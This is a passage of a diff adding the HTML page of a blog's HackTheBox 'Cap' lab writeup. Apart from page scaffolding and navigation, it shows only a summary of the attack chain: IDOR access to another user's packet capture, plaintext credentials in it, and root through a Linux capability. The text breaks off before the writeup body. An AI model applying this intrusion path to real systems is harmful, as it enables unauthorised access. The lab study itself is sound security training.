@@ -1,0 +1,1578 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Cap Writeup - HackTheBox &middot; DarknessE1</title>
+  <meta name="title" content="Cap Writeup - HackTheBox &middot; DarknessE1" />
+  
+  <meta name="description" content="Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&#39;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root." />
+  <meta name="keywords" content="HackTheBox, Linux, Easy, " />
+  
+  
+  <link rel="canonical" href="/writeups/hackthebox/cap/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.85f006de1806b55b2d082d1122deedd8cec6fdc1f7c8a51be975a4496165d6c798f4a3de52545a6a87cc4bc09fc2d6f5201d44ea57acc1ac2b1c42a688c62bee.css"
+    integrity="sha512-hfAG3hgGtVstCC0RIt7t2M7G/cH3yKUb6XWkSWFl1seY9KPeUlRaaofMS8Cfwtb1IB1E6leswawrHEKmiMYr7g==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.b8f12e2e21d0fce82f8d935f9cb80321fa3fca124fa36cc4df6e4b7474223741a777eb2b65f810cc333bd862f49543df61cf5607a0736faf053ffe9b9c39ff8a.js"
+    integrity="sha512-uPEuLiHQ/OgvjZNfnLgDIfo/yhJPo2zE325LdHQiN0Gnd&#43;srZfgQzDM72GL0lUPfYc9WB6Bzb68FP/6bnDn/ig==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Cap Writeup - HackTheBox" />
+<meta property="og:description" content="Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&#39;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeups/hackthebox/cap/" /><meta property="og:image" content="/writeups/hackthebox/cap/feature.png"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2025-02-26T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-02-26T00:00:00+00:00" /><meta property="og:site_name" content="DarknessE1" />
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/writeups/hackthebox/cap/feature.png"/>
+<meta name="twitter:title" content="Cap Writeup - HackTheBox"/>
+<meta name="twitter:description" content="Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&#39;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "WriteUps",
+    "name": "Cap Writeup - HackTheBox",
+    "headline": "Cap Writeup - HackTheBox",
+    "description": "Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user\u0027s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.",
+    "abstract": "Cap (Linux) # Link: https:\/\/app.",
+    "inLanguage": "en",
+    "url" : "\/writeups\/hackthebox\/cap\/",
+    "author" : {
+      "@type": "Person",
+      "name": "DarknessE1"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-02-26T00:00:00\u002b00:00",
+    "datePublished": "2025-02-26T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-02-26T00:00:00\u002b00:00",
+    
+    "keywords": ["HackTheBox","Linux","Easy"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "842"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="DarknessE1" />
+  
+  
+  
+  <link href="https://app.hackthebox.com/profile/350597" rel="me" />
+  
+  
+  <link href="https://tryhackme.com/p/DarknessE1" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">DarknessE1</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="DarknessE1">
+        Home
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/about-me/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="About-Me">
+        About-Me
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="WriteUps">
+        Writeups
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Tags">
+        Tags
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="DarknessE1">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about-me/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="About-Me">
+            About-Me
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="WriteUps">
+            Writeups
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Tags">
+            Tags
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/writeups/hackthebox/cap/feature.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      >DarknessE1</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/writeups/"
+      >WriteUps</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/writeups/hackthebox/"
+      >HackTheBox</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/writeups/hackthebox/cap/"
+      >Cap Writeup - HackTheBox</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Cap Writeup - HackTheBox
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-02-26 00:00:00 &#43;0000 UTC">26 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span>842 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hackthebox/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    HackTheBox
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/easy/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Easy
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="DarknessE1" src="/img/picture.jpg" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      DarknessE1
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Security Researcher | Web &amp; OSINT</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://app.hackthebox.com/profile/350597"
+          target="_blank"
+          aria-label="Hackthebox"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg fill="currentColor" width="800px" height="800px" viewBox="0 0 24 24" role="img" xmlns="http://www.w3.org/2000/svg"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://tryhackme.com/p/DarknessE1"
+          target="_blank"
+          aria-label="Tryhackme"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="Tryhackme--Streamline-Simple-Icons" height="24" width="24"><desc>Tryhackme Streamline Icon: https://streamlinehq.com</desc><title>TryHackMe</title><path d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0 -4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a0.625 0.625 0 1 0 0 -1.25H4.761a3.273 3.273 0 0 1 -3.27 -3.27A3.273 3.273 0 0 1 6.59 7.08a0.625 0.625 0 0 0 0.7 -1.035 4.488 4.488 0 0 0 -1.68 -0.69 5.223 5.223 0 0 1 5.096 -4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0 -0.488 0.305 0.625 0.625 0 1 0 0.731 1.013 3.245 3.245 0 0 1 1.912 -0.616 3.278 3.278 0 0 1 3.203 2.61 0.625 0.625 0 0 0 1.225 -0.251 4.533 4.533 0 0 0 -4.428 -3.61 4.54 4.54 0 0 0 -0.958 0.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a0.925 0.925 0 0 0 -0.462 0.108 0.913 0.913 0 0 0 -0.313 0.29 1.27 1.27 0 0 0 -0.175 0.427 2.39 2.39 0 0 0 -0.054 0.514c0 0.181 0.018 0.353 0.054 0.517 0.036 0.164 0.095 0.307 0.175 0.43a0.899 0.899 0 0 0 0.313 0.297c0.127 0.073 0.281 0.11 0.462 0.11 0.18 0 0.334 -0.037 0.46 -0.11a0.897 0.897 0 0 0 0.309 -0.296c0.08 -0.124 0.137 -0.267 0.173 -0.431 0.036 -0.164 0.054 -0.336 0.054 -0.517 0 -0.18 -0.018 -0.352 -0.054 -0.514a1.271 1.271 0 0 0 -0.173 -0.426 0.901 0.901 0 0 0 -0.309 -0.291 0.917 0.917 0 0 0 -0.46 -0.108zm6.486 0a0.925 0.925 0 0 0 -0.462 0.108 0.913 0.913 0 0 0 -0.313 0.29 1.27 1.27 0 0 0 -0.175 0.427 2.39 2.39 0 0 0 -0.053 0.514c0 0.181 0.017 0.353 0.053 0.517 0.036 0.164 0.095 0.307 0.175 0.43a0.899 0.899 0 0 0 0.313 0.297c0.127 0.073 0.281 0.11 0.462 0.11 0.18 0 0.334 -0.037 0.46 -0.11a0.897 0.897 0 0 0 0.31 -0.296c0.078 -0.124 0.136 -0.267 0.172 -0.431 0.036 -0.164 0.054 -0.336 0.054 -0.517 0 -0.18 -0.018 -0.352 -0.054 -0.514a1.271 1.271 0 0 0 -0.173 -0.426 0.901 0.901 0 0 0 -0.308 -0.291 0.916 0.916 0 0 0 -0.461 -0.108zm-8.537 0.068 -0.84 0.618 0.313 0.43 0.476 -0.368v1.877h0.603v-2.557zm6.486 0 -0.841 0.618 0.314 0.43 0.477 -0.368v1.877h0.603v-2.557zm-4.435 0.445c0.08 0 0.143 0.028 0.193 0.084 0.05 0.057 0.087 0.127 0.114 0.21 0.026 0.083 0.044 0.173 0.054 0.269a2.541 2.541 0 0 1 0 0.533c-0.01 0.097 -0.028 0.187 -0.054 0.27a0.584 0.584 0 0 1 -0.114 0.21 0.243 0.243 0 0 1 -0.193 0.085 0.248 0.248 0 0 1 -0.195 -0.086 0.584 0.584 0 0 1 -0.118 -0.209 1.245 1.245 0 0 1 -0.056 -0.27 2.645 2.645 0 0 1 0 -0.533c0.01 -0.096 0.029 -0.186 0.056 -0.27a0.583 0.583 0 0 1 0.118 -0.209 0.25 0.25 0 0 1 0.195 -0.084zm6.486 0c0.08 0 0.144 0.028 0.193 0.084 0.05 0.057 0.087 0.127 0.114 0.21 0.027 0.083 0.044 0.173 0.054 0.269a2.541 2.541 0 0 1 0 0.533c-0.01 0.097 -0.027 0.187 -0.054 0.27a0.584 0.584 0 0 1 -0.114 0.21 0.243 0.243 0 0 1 -0.193 0.085 0.249 0.249 0 0 1 -0.195 -0.086 0.581 0.581 0 0 1 -0.117 -0.209 1.245 1.245 0 0 1 -0.056 -0.27 2.642 2.642 0 0 1 0 -0.533c0.01 -0.096 0.028 -0.186 0.056 -0.27a0.58 0.58 0 0 1 0.117 -0.209 0.25 0.25 0 0 1 0.195 -0.084zm-2.191 3.51a0.93 0.93 0 0 0 -0.463 0.109 0.908 0.908 0 0 0 -0.312 0.291c-0.08 0.122 -0.139 0.263 -0.175 0.426a2.383 2.383 0 0 0 -0.054 0.514c0 0.18 0.018 0.353 0.054 0.516 0.036 0.164 0.094 0.308 0.175 0.432a0.91 0.91 0 0 0 0.312 0.296 0.92 0.92 0 0 0 0.463 0.11c0.18 0 0.333 -0.037 0.46 -0.11a0.892 0.892 0 0 0 0.308 -0.296 1.32 1.32 0 0 0 0.174 -0.432c0.036 -0.163 0.054 -0.335 0.054 -0.516 0 -0.18 -0.018 -0.352 -0.054 -0.514a1.274 1.274 0 0 0 -0.174 -0.426 0.89 0.89 0 0 0 -0.309 -0.291 0.918 0.918 0 0 0 -0.46 -0.108zm-6.402 0.07 -0.841 0.617 0.314 0.43 0.476 -0.369v1.878h0.604v-2.557zm2.125 0 -0.841 0.617 0.314 0.43 0.477 -0.369v1.878h0.603v-2.557zm2.116 0 -0.84 0.617 0.313 0.43 0.477 -0.369v1.878h0.603v-2.557zm2.16 0.443c0.08 0 0.144 0.028 0.194 0.085a0.605 0.605 0 0 1 0.114 